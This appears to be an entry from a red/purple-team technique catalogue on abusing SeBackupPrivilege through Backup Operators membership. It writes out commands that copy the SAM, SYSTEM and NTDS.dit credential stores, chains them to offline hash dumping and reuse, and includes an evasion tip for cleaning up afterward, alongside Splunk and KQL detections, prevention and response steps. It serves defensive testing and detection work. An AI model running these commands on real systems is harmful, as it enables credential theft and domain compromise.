examples.label: Load the SeBackupPrivilege modules and enable it

notes:
=== SeBackupPrivilege - File Copy Bypassing ACL ===
Backup Operators get SeBackupPrivilege - use FILE_FLAG_BACKUP_SEMANTICS to bypass any file ACL.

=== WHAT SeBackupPrivilege DOES ===
OS flag FILE_FLAG_BACKUP_SEMANTICS instructs Windows to bypass normal ACL enforcement.
Standard copy/cat commands do NOT use this flag → will be denied normally.
SeBackupPrivilege PoC library exposes Copy-FileSeBackupPrivilege which uses the correct flag.

=== ATTACK FLOW ===
1. Confirm group membership: whoami /groups | findstr Backup
2. Transfer SeBackupPrivilege DLLs to target
3. Enable the privilege (Disabled by default):
   Import-Module .\SeBackupPrivilegeCmdLets.dll
   Import-Module .\SeBackupPrivilegeUtils.dll
   Set-SeBackupPrivilege
   whoami /priv | findstr Backup   → must show Enabled
4. Copy protected file:
   Copy-FileSeBackupPrivilege 'C:\Windows\System32\config\SAM' '.\SAM'
   Copy-FileSeBackupPrivilege 'C:\Windows\System32\config\SYSTEM' '.\SYSTEM'

ALTERNATIVE - robocopy backup mode (no extra tools):
  robocopy /B C:\Windows\System32\config .\config SAM SYSTEM SECURITY

=== KEY REQUIREMENT ===
Backup Operators are permitted to LOG ON LOCALLY to Domain Controllers.
This enables running the attack directly on the DC - which is where the payoff is.

=== CHAINING CONTEXT ===
Copy SAM + SYSTEM → secretsdump.py SAM SYSTEM LOCAL → local account hashes
Local admin hash reuse (imaged environments) → instant access to other hosts
SeBackupPrivilege also enables NTDS.dit extraction (see sebackup-ntds-diskshadow)
Copy web.config, KeePass .kdbx, .rdp files too

=== WHAT TO LOOK FOR ===
Any non-admin account in Backup Operators = critical finding
Service accounts added to Backup Operators for backup software = frequently overlooked
robocopy /B requires no extra tools - zero footprint when tool transfer is blocked

recommended.note: Chain it with a shadow copy to steal ntds.dit on a DC.
Which protected files are worth copying.

name: Backup Operators - Copy Protected File (SeBackupPrivilege)
description: Members of Backup Operators hold SeBackupPrivilege, which bypasses file ACLs for reads. Import the SeBackupPrivilege cmdlets, enable the privilege, then copy any file regardless of its DACL.

defense.why_it_works: SeBackupPrivilege grants the FILE_FLAG_BACKUP_SEMANTICS API flag that bypasses normal NTFS ACL enforcement for file reads. The SeBackupPrivilege PowerShell library exposes Copy-FileSeBackupPrivilege which uses this flag, allowing members of Backup Operators to read any file on the system regardless of permissions - including SAM, SYSTEM, and NTDS.dit.
defense.prerequisites: SeBackupPrivilege assigned (Backup Operators group membership or explicit assignment). SeBackupPrivilege must be enabled in the current token (via Set-SeBackupPrivilege). Elevated shell to bypass UAC.
defense.impact: Read access to any file on the system regardless of ACL. Enables extraction of SAM/SYSTEM hives for local credential dumping or NTDS.dit for domain credential dumping.
defense.detection: File access events via backup semantics API on protected files (SAM, SECURITY, NTDS.dit). Audit: Backup Operators group member reads sensitive registry hives. Event ID 4656 with FILE_FLAG_BACKUP_SEMANTICS flag.
defense.artifacts: Audit log: file read on SAM/SYSTEM by backup operator | Event 4656: handle requested on sensitive file | SAM.SAV/SYSTEM.SAV files created in staging directory
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" EventCode=4656 Object_Name="*\\config\\SAM" Accesses="*BACKUP*"
| table _time, Computer, Account_Name, Object_Name

index=wineventlog EventCode=4104 ScriptBlockText="*Copy-FileSeBackupPrivilege*"
| table _time, Computer, User, ScriptBlockText
defense.elastic_kql: event.code:"4656" AND winlog.event_data.ObjectName:(*SAM OR *SECURITY OR *ntds.dit) AND winlog.event_data.AccessMask:*
defense.sentinel_kql:
DeviceEvents
| where ActionType == "PowerShellCommand" and ProcessCommandLine has "Copy-FileSeBackupPrivilege"
| project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine
| union (SecurityEvent | where EventID == 4656 and ObjectName has_any ("config\\SAM","ntds.dit") | project Timestamp=TimeGenerated, DeviceName=Computer, InitiatingProcessAccountName=SubjectUserName, ProcessCommandLine=ObjectName)
| sort by Timestamp desc
defense.prevention: Audit Backup Operators group membership - treat as equivalent to Domain Admin. Restrict local DC logon for Backup Operators unless operationally required. Require MFA for Backup Operators accounts. Monitor file access to SAM, SECURITY, NTDS.dit.
defense.misconfiguration: Accounts added to Backup Operators without understanding the privilege implications. No monitoring on sensitive file access using backup semantics.
defense.vulnerable_config:
# User in Backup Operators
whoami /groups | findstr 'Backup'

# Copy protected file bypassing ACL:
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

# Copy SAM/SYSTEM for offline cracking:
reg save HKLM\SAM SAM.SAV
reg save HKLM\SYSTEM SYSTEM.SAV
defense.secure_config:
# Audit Backup Operators
Get-LocalGroupMember -Group 'Backup Operators'

# Monitor sensitive file access (File System auditing via GPO)
# Enable: Audit Object Access > Success + Failure on:
# C:\Windows\System32\config\SAM
# C:\Windows\System32\config\SECURITY
# C:\Windows\NTDS\ntds.dit
defense.evasion: Copy the hives/ntds via the shadow copy, parse OFFLINE, and remove the shadow copy + copied files after.

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review PowerShell Script Block / Module Logs, Windows Security Event Log, Sysmon for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

explain:
Abuses Backup Operators' SeBackupPrivilege (which bypasses file ACLs on read) to copy any protected file:
  Copy-FileSeBackupPrivilege   copy using the backup semantics that ignore the DACL
  '<protected_file>'       the file you cannot normally read
  .\out.txt                the local copy
Import the SeBackupPrivilege cmdlets and enable the privilege first; then read otherwise-denied files (configs, hive backups, flags).
